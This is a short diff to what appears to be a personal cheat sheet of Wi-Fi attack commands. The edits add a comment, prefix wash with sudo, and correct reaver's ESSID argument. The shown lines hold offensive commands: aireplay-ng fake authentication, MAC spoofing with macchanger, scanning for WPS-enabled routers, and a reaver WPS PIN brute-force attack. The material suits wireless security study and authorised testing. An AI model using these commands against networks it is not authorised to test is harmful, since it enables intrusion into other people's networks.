@@ -209,6 +209,7 @@ sudo aireplay-ng --fakeaut 0 -e "My Wifi name" -a 00:01:02:03:04:05 wlan1mon	# B
 
 # Mask your MAC
 ###############
+# Aasuming you're already in monitor mode:
 ifconfig wlan1mon down
 macchanger -a wlan1mon
 ifconfig wlan1mon up
@@ -216,12 +217,12 @@ ifconfig wlan1mon up
 
 # Find only routers that have WPS enabled
 #########################################
-wash -i wlan1mon
+sudo wash -i wlan1mon
 	# Note the channel, BSSID (MAC) and ESSID (wifi name)
 
 # Run the WPS attack
 ####################
-reaver -i wlan1mon -c 6 -e 00:00:00:00:00:00 -b 11:11:11:11:11:11 -vv
+reaver -i wlan1mon -c 6 -e "MyWifi" -b 11:11:11:11:11:11 -vv
 	# -i	# Wireless monitor interface/adapter
 	# -c 6	# The router's channel (using 6 for example)
 	# -e	# The wifi name/ESSID
